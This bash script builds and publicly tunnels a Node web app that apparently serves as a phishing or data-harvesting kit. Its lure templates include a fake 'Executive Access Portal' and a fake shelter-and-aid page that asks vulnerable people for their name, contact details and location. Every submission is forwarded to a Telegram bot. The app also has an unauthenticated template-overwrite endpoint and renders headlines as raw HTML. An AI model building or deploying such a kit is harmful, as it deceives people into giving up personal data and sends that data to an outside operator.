#!/bin/bash
# ==============================================================================
# PROPRIETARY ASSET: EB Enterprises - Multi-Template Customizable Capture Hub
# ==============================================================================
set -e

echo "[+] Initializing multi-template capture hub..."
mkdir -p public server

echo "[+] Writing Backend Server (server.js)..."
cat << 'SRV_EOF' > server.js
process.removeAllListeners('warning');
process.on('warning', (warning) => {
    if (warning.name === 'DeprecationWarning') return;
    console.warn(warning.name, warning.message);
});

const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const https = require('https');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;
const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/eb_multi_capture_hub';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let memoryStore = [];

let isMongoConnected = false;
mongoose.connect(MONGO_URI).then(() => {
    isMongoConnected = true;
    console.log("[+] Connected to MongoDB instance.");
}).catch(err => {
    console.warn("[!] MongoDB offline. Operating on resilient in-memory store.");
});

const SubmissionSchema = new mongoose.Schema({
    templateId: { type: String, required: true },
    data: { type: Object, required: true },
    createdAt: { type: Date, default: Date.now }
});

const Submission = mongoose.models.Submission || mongoose.model('Submission', SubmissionSchema);

const CONFIG_FILE = path.join(__dirname, 'templates.json');

// Default templates covering executive, community support, focus matrix, and raw feedback
let templates = {
    "executive": {
        name: "Executive Spectrum",
        pageTitle: "Executive Access Portal",
        badgeText: "EB Enterprises",
        headline: "High-Performance <span>Systems Access</span>",
        subheadline: "Secure authorization gateway for proprietary architecture deployments and executive infrastructure.",
        buttonText: "Authorize & Connect",
        accentColor: "#00d2c4",
        fields: [
            { id: "fullName", label: "Principal Name", type: "text", placeholder: "Alex Mercer", required: true },
            { id: "email", label: "Corporate Email", type: "email", placeholder: "alex@eb-enterprises.io", required: true },
            { id: "tier", label: "Access Tier", type: "text", placeholder: "Level 4 Principal Architect", required: true }
        ]
    },
    "community": {
        name: "Community Support",
        pageTitle: "Community Aid & Resource Hub",
        badgeText: "Dignity & Access",
        headline: "Find Shelter & <span>Support Services</span>",
        subheadline: "Connect directly with emergency housing, warm meals, healthcare services, and community advocates.",
        buttonText: "Request Assistance Now",
        accentColor: "#38bdf8",
        fields: [
            { id: "fullName", label: "Your Name or Alias", type: "text", placeholder: "Preferred identifier", required: true },
            { id: "contactInfo", label: "Contact Info (Phone/Shelter)", type: "text", placeholder: "How can support reach you?", required: true },
            { id: "resourceNeeded", label: "Primary Need", type: "text", placeholder: "Emergency Shelter / Meals / Medical", required: true },
            { id: "locationNotes", label: "Current Location / Area", type: "text", placeholder: "Downtown core / specific landmark", required: true }
        ]
    },
    "focus": {
        name: "Focus Matrix",
        pageTitle: "Focus Matrix Engine",
        badgeText: "Zero Noise",
        headline: "Absolute <span>Execution Focus</span>",
        subheadline: "Eliminate distractions, lock onto your single primary objective, and execute without hesitation.",
        buttonText: "Initialize Focus Matrix",
        accentColor: "#8b5cf6",
        fields: [
            { id: "fullName", label: "Your Name", type: "text", placeholder: "Sam Vance", required: true },
            { id: "email", label: "Email Address", type: "email", placeholder: "sam@focusmatrix.app", required: true },
            { id: "coreObjective", label: "Single Core Objective", type: "text", placeholder: "Finish full-stack build & verify core logic", required: true }
        ]
    }
};

if (fs.existsSync(CONFIG_FILE)) {
    try {
        templates = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
    } catch (e) {
        console.warn("[!] Failed to parse templates.json, using defaults.");
    }
}

app.get('/api/templates', (req, res) => {
    res.json(templates);
});

app.post('/api/templates', (req, res) => {
    try {
        templates = req.body;
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(templates, null, 2));
        res.json({ success: true, message: 'Templates updated successfully.' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/capture/:templateId', async (req, res) => {
    try {
        const { templateId } = req.params;
        const formData = req.body;
        let totalCount;

        if (isMongoConnected) {
            const count = await Submission.countDocuments({ templateId });
            totalCount = count + 1;
            const sub = new Submission({ templateId, data: formData });
            await sub.save();
        } else {
            totalCount = memoryStore.filter(s => s.templateId === templateId).length + 1;
            memoryStore.unshift({ templateId, data: formData, createdAt: new Date() });
        }

        console.log("\n==================================================");
        console.log(`📥 [HUB CAPTURE] TEMPLATE: [${templateId}] | [#${totalCount}]`);
        console.log(JSON.stringify(formData, null, 2));
        console.log("==================================================\n");

        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            let text = `📥 *New Submission [${templateId}] (#${totalCount})*\n\n`;
            for (const [k, v] of Object.entries(formData)) {
                text += `*${k}:* \`${v}\`\n`;
            }
            const message = encodeURIComponent(text);
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=Markdown`;
            https.get(url, (resp) => {}).on('error', () => {});
        }

        res.json({ success: true, message: 'Submission captured and logged successfully.', totalCount });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.use(express.static(path.join(__dirname, 'public')));

app.listen(PORT, () => {
    console.log(`[+] Multi-Template Hub active on port ${PORT}`);
});
SRV_EOF

echo "[+] Writing Stylesheet (public/style.css)..."
cat << 'CSS_EOF' > public/style.css
:root {
    --bg-base: #04060b;
    --surface: #0a0f1d;
    --card: #12192b;
    --border: #1f2b45;
    --text-main: #ffffff;
    --text-muted: #94a3b8;
    --accent: #00d2c4;
    --accent-glow: rgba(0, 210, 196, 0.25);
    --gold: #fde047;
    --success: #22c55e;
}

* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: var(--bg-base);
    color: var(--text-main);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 2rem 1rem;
}

.hub-nav {
    width: 100%;
    max-width: 680px;
    display: flex;
    gap: 0.5rem;
    margin-bottom: 1.25rem;
    overflow-x: auto;
    padding-bottom: 0.5rem;
}

.tab-btn {
    background: var(--surface);
    border: 1px solid var(--border);
    color: var(--text-muted);
    padding: 0.6rem 1.1rem;
    border-radius: 8px;
    font-size: 0.8rem;
    font-weight: 700;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 0.05em;
    transition: all 0.2s;
    white-space: nowrap;
}

.tab-btn.active {
    background: var(--card);
    border-color: var(--accent);
    color: var(--text-main);
    box-shadow: 0 0 15px var(--accent-glow);
}

.wrapper {
    width: 100%;
    max-width: 680px;
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 3rem 2.5rem;
    box-shadow: 0 30px 70px rgba(0, 0, 0, 0.85);
    position: relative;
    overflow: hidden;
}

.wrapper::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 4px;
    background: linear-gradient(90deg, var(--accent), var(--gold));
}

.header {
    text-align: center;
    margin-bottom: 2rem;
}

.badge {
    display: inline-block;
    background: rgba(0, 210, 196, 0.1);
    border: 1px solid rgba(0, 210, 196, 0.3);
    color: var(--accent);
    font-size: 0.75rem;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    padding: 0.35rem 1rem;
    border-radius: 20px;
    margin-bottom: 1rem;
}

.header h1 {
    font-size: 2.1rem;
    font-weight: 800;
    letter-spacing: -0.02em;
    color: var(--text-main);
    margin-bottom: 0.6rem;
    line-height: 1.2;
}

.header h1 span {
    color: var(--accent);
}

.header p {
    color: var(--text-muted);
    font-size: 0.95rem;
    line-height: 1.5;
}

.form {
    display: flex;
    flex-direction: column;
    gap: 1.25rem;
}

.field {
    display: flex;
    flex-direction: column;
    gap: 0.4rem;
}

label {
    font-size: 0.75rem;
    color: var(--text-muted);
    text-transform: uppercase;
    letter-spacing: 0.08em;
    font-weight: 700;
}

input, select, textarea {
    width: 100%;
    background: var(--bg-base);
    border: 1px solid var(--border);
    color: var(--text-main);
    padding: 0.95rem 1.1rem;
    border-radius: 8px;
    font-size: 0.95rem;
    outline: none;
    transition: all 0.2s;
}

input:focus, select:focus, textarea:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 3px var(--accent-glow);
}

textarea {
    resize: vertical;
    min-height: 90px;
}

button.submit-btn {
    background: linear-gradient(135deg, var(--accent), #00a89d);
    color: var(--bg-base);
    border: none;
    padding: 1.15rem;
    font-weight: 800;
    border-radius: 8px;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    font-size: 0.95rem;
    transition: all 0.2s;
    box-shadow: 0 6px 20px var(--accent-glow);
    margin-top: 0.5rem;
}

button.submit-btn:hover {
    transform: translateY(-1px);
    box-shadow: 0 8px 25px var(--accent-glow);
}

#feedback {
    margin-top: 1.25rem;
    padding: 0.95rem;
    border-radius: 8px;
    display: none;
    font-weight: 600;
    font-size: 0.85rem;
    text-align: center;
}

.customizer-toggle {
    margin-top: 1.5rem;
    text-align: center;
}

.customizer-toggle button {
    background: none;
    border: none;
    color: var(--text-muted);
    font-size: 0.8rem;
    cursor: pointer;
    text-decoration: underline;
}

.customizer-panel {
    display: none;
    margin-top: 1.5rem;
    background: var(--card);
    border: 1px solid var(--border);
    padding: 1.5rem;
    border-radius: 10px;
}

.customizer-panel h3 {
    font-size: 0.95rem;
    color: var(--gold);
    margin-bottom: 1rem;
    text-transform: uppercase;
    letter-spacing: 0.05em;
}

.footer {
    margin-top: 1.75rem;
    text-align: center;
    font-size: 0.75rem;
    color: var(--text-muted);
    letter-spacing: 0.04em;
    border-top: 1px solid var(--border);
    padding-top: 1.25rem;
}
CSS_EOF

echo "[+] Writing Page (public/index.html)..."
cat << 'HTML_EOF' > public/index.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title id="docTitle">Multi-Template Capture Hub</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div id="hubNav" class="hub-nav"></div>

    <div class="wrapper">
        <div class="header">
            <div id="badgeEl" class="badge">Live Hub</div>
            <h1 id="headlineEl">Capture Portal <span>Engine</span></h1>
            <p id="subheadlineEl">Select a template above or customize your fields and copy instantly.</p>
        </div>

        <form id="dynamic-form" class="form">
            <div id="formFieldsContainer"></div>
            <button type="submit" id="submitBtn" class="submit-btn">Submit Information</button>
        </form>

        <div id="feedback"></div>

        <div class="customizer-toggle">
            <button type="button" onclick="toggleCustomizer()">⚙️ Customize Active Template</button>
        </div>

        <div id="customizerPanel" class="customizer-panel">
            <h3 id="customizerTitle">Live Template Configurator</h3>
            <form id="config-form" class="form">
                <div class="field">
                    <label>Page Title</label>
                    <input type="text" id="cfgTitle" required>
                </div>
                <div class="field">
                    <label>Badge Text</label>
                    <input type="text" id="cfgBadge" required>
                </div>
                <div class="field">
                    <label>Headline HTML (Supports span)</label>
                    <input type="text" id="cfgHeadline" required>
                </div>
                <div class="field">
                    <label>Subheadline Text</label>
                    <textarea id="cfgSubheadline" required></textarea>
                </div>
                <div class="field">
                    <label>Button Text</label>
                    <input type="text" id="cfgButton" required>
                </div>
                <div class="field">
                    <label>Accent Color (Hex)</label>
                    <input type="text" id="cfgAccent" required>
                </div>
                <button type="submit" class="submit-btn" style="background: var(--gold); color: #000;">Save &amp; Apply Changes</button>
            </form>
        </div>

        <div class="footer">
            EB Enterprises &bull; Multi-Template Capture Hub &bull; All Rights Reserved
        </div>
    </div>

    <script>
        let allTemplates = {};
        let activeKey = 'executive';

        async function loadHub() {
            const res = await fetch('/api/templates');
            allTemplates = await res.json();
            renderNav();
            renderTemplate(activeKey);
        }

        function renderNav() {
            const nav = document.getElementById('hubNav');
            nav.innerHTML = '';
            for (const [key, t] of Object.entries(allTemplates)) {
                const btn = document.createElement('button');
                btn.className = `tab-btn ${key === activeKey ? 'active' : ''}`;
                btn.textContent = t.name;
                btn.onclick = () => {
                    activeKey = key;
                    renderNav();
                    renderTemplate(activeKey);
                };
                nav.appendChild(btn);
            }
        }

        function renderTemplate(key) {
            const cfg = allTemplates[key];
            if (!cfg) return;

            document.documentElement.style.setProperty('--accent', cfg.accentColor || '#00d2c4');
            document.documentElement.style.setProperty('--accent-glow', (cfg.accentColor || '#00d2c4') + '40');

            document.getElementById('docTitle').textContent = cfg.pageTitle;
            document.getElementById('badgeEl').textContent = cfg.badgeText;
            document.getElementById('headlineEl').innerHTML = cfg.headline;
            document.getElementById('subheadlineEl').textContent = cfg.subheadline;
            document.getElementById('submitBtn').textContent = cfg.buttonText;

            // Configurator fields
            document.getElementById('cfgTitle').value = cfg.pageTitle;
            document.getElementById('cfgBadge').value = cfg.badgeText;
            document.getElementById('cfgHeadline').value = cfg.headline;
            document.getElementById('cfgSubheadline').value = cfg.subheadline;
            document.getElementById('cfgButton').value = cfg.buttonText;
            document.getElementById('cfgAccent').value = cfg.accentColor || '#00d2c4';
            document.getElementById('customizerTitle').textContent = `Customize: ${cfg.name}`;

            const container = document.getElementById('formFieldsContainer');
            container.innerHTML = '';

            cfg.fields.forEach(f => {
                const div = document.createElement('div');
                div.className = 'field';
                
                const label = document.createElement('label');
                label.setAttribute('for', f.id);
                label.textContent = f.label + (f.required ? ' *' : '');
                div.appendChild(label);

                const input = document.createElement('input');
                input.type = f.type || 'text';
                input.id = f.id;
                input.placeholder = f.placeholder;
                if (f.required) input.required = true;
                div.appendChild(input);

                container.appendChild(div);
            });

            document.getElementById('feedback').style.display = 'none';
        }

        function toggleCustomizer() {
            const panel = document.getElementById('customizerPanel');
            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
        }

        document.getElementById('dynamic-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const cfg = allTemplates[activeKey];
            const feedback = document.getElementById('feedback');
            const submitBtn = document.getElementById('submitBtn');

            const formData = {};
            cfg.fields.forEach(f => {
                formData[f.id] = document.getElementById(f.id).value.trim();
            });

            submitBtn.disabled = true;
            submitBtn.textContent = 'Transmitting...';

            try {
                const res = await fetch(`/api/capture/${activeKey}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
                const data = await res.json();

                feedback.style.display = 'block';
                if (res.ok) {
                    feedback.style.background = 'rgba(34, 197, 94, 0.15)';
                    feedback.style.color = 'var(--success)';
                    feedback.style.border = '1px solid var(--success)';
                    feedback.textContent = data.message;
                    document.getElementById('dynamic-form').reset();
                    submitBtn.textContent = 'Submitted ✓';
                } else {
                    throw new Error(data.error || 'Submission failed.');
                }
            } catch (err) {
                feedback.style.display = 'block';
                feedback.style.background = 'rgba(239, 68, 68, 0.15)';
                feedback.style.color = '#ef4444';
                feedback.style.border = '1px solid #ef4444';
                feedback.textContent = err.message;
                submitBtn.disabled = false;
                submitBtn.textContent = cfg.buttonText;
            }
        });

        document.getElementById('config-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            let cfg = allTemplates[activeKey];
            cfg.pageTitle = document.getElementById('cfgTitle').value.trim();
            cfg.badgeText = document.getElementById('cfgBadge').value.trim();
            cfg.headline = document.getElementById('cfgHeadline').value.trim();
            cfg.subheadline = document.getElementById('cfgSubheadline').value.trim();
            cfg.buttonText = document.getElementById('cfgButton').value.trim();
            cfg.accentColor = document.getElementById('cfgAccent').value.trim();

            const res = await fetch('/api/templates', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(allTemplates)
            });
            const data = await res.json();
            if (res.ok) {
                renderTemplate(activeKey);
                toggleCustomizer();
                alert('Template configuration saved successfully!');
            } else {
                alert('Error: ' + data.error);
            }
        });

        loadHub();
    </script>
</body>
</html>
HTML_EOF

echo "[+] Starting application server..."
pkill -f "node" 2>/dev/null || true
sleep 1
PORT=5000 nohup node server.js > server.log 2>&1 &
sleep 2

echo "[+] Launching public tunnel via localtunnel..."
rm -f public_url.log
npx -y localtunnel --port 5000 > public_url.log 2>&1 &

PUBLIC_URL=""
for i in {1..10}; do
    sleep 1
    if [ -f public_url.log ]; then
        PUBLIC_URL=$(grep -o 'https://[a-z0-9.-]*localtunnel\.me' public_url.log || true)
        if [ -n "$PUBLIC_URL" ]; then
            break
        fi
    fi
done

if [ -z "$PUBLIC_URL" ]; then
    PUBLIC_URL=$(grep -o 'https://[a-z0-9.-]*\.loca\.lt' public_url.log || true)
fi

echo ""
echo "=================================================="
if [ -n "$PUBLIC_URL" ]; then
    echo "🌍 [SUCCESS] YOUR MULTI-TEMPLATE CAPTURE HUB:"
    echo "    $PUBLIC_URL"
    echo ""
    echo "    (Switch between Executive, Community Support, and Focus Matrix templates at the top!"
    echo "     Click the gear icon to customize copy, fields, and accent colors live.)"
else
    echo "[!] Tunnel URL lookup pending. Run: npx localtunnel --port 5000"
    echo "    Local URL: http://localhost:5000"
fi
echo "=================================================="
echo ""
